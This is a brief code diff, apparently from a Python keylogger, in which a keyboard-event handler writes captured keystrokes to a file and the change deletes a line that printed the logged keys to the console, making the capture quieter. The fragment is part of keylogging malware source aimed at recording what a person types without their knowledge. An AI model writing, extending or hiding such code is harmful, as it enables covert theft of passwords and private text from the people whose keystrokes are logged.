@@ -27,7 +27,6 @@ def OnKeyboardEvent(event):
     if event.Ascii == 13:
         keylogs += '/n'
     f.write(keylogs)
-    print(keylogs)
     f.close()
 
 
